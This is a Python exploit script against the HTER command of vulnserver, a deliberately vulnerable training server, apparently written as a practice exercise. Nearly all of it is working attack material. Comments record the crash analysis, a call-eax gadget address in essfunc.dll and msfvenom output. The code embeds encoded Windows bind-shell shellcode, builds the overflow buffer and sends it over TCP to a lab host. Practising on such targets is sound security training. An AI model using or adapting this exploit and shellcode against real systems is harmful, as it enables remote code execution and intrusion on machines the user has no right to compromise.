#!/usr/bin/python

import socket
import sys

host = "192.168.56.103"
port = 9999

#########################################
## WriTTen by: van6uard
## vulnserver HTER Exploit
## badchars =  
## This is converting the characters sent to hex values.  
## pattern_create won't work, as the characters get mangled, so do need to do manually.
## The script sends A characters. However the EIP is overwritten with 0xAAAAAAAA, instead of 0x41414141.
## The first 0 character was removed. Let us change 'HTER' to 'HTER 0'. Now the shellcode can be appended right after this string.
## The EAX buffer points to the beginning of the our 'A' buffer
## mona jmp -r EAX
## Log data, item 7  Address=625015B1  Message=  0x625015b1 : call eax |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\van6uard\Desktop\vulnserver\essfunc.dll)
## msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -b '\x00' -f hex
## [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
## [-] No arch selected, selecting arch: x86 from the payload
## Found 11 compatible encoders
## Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
## x86/shikata_ga_nai succeeded with size 355 (iteration=0)
## x86/shikata_ga_nai chosen with final size 355
## Payload size: 355 bytes
## Final size of hex file: 710 bytes

shellcode = ('b89c7fc7cbdbcad97424f45d33c9b153314512034512837183253e759428c185654d4b60544d2fe1c77d3ba7ebf669537f7aa654c831905bc96ae0fa497135dc70ba481db4a7a14f6da3147f1af9a4f450eface9210e9cbc3a493e3feee17727f3cccedcc7bbd03416437e7996b67ebe1129f5b661d40e0d1b029a95bbc13c713d05daf231e2a85c56f57dd7627e8037e3c4a793af9fc6821571f6d4f52e529f183aefc2748fc2fc8487558fb608ce07fbc1c8d0fcfbad4e0304ce47c0509effe1d875ff0e0de3f7a9fe16fa0aaf9654e3a5188b13c6f2a4bc3bfddb60b51bb18893b42d6bc00cca9422257cdc24f283dd6254135661600269acc053fe3a81169e3b88c003a957104dd2cf471a24060db61fb0334bf9fbf7903a05f6550621e8a3876d5c7cde3b0a3a888de494674460604457f66d812116df7c7429d0e870520c897f8994a99d1be14138ce480cbb258e2938cf6fce20ba6a8ae65707838257b4a486'
        )
# had to account for stack aligment with the hex only characters it wont accept \x90
nops = '90' *32

## Needed to add a 0 to this string as the first character is getting cut.  So adding a character it drops that then sits at the start of EAX.
## Added 505c  which is PUSH EAX, POP ESP
buf = 'HTER 0505c' + nops
buf += shellcode
buf += 'A' * (2040-len(nops)-4-len(shellcode))
buf += 'b1155062'
buf += 'F'*2952


try:
    c = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #tcp socket
    c.connect((host, port))
    c.send(buf + '\r\n')
    print "[+] Evil buffer sent"
    c.close()

except:
    print "[-] Can't send evil buffer"
    sys.exit()
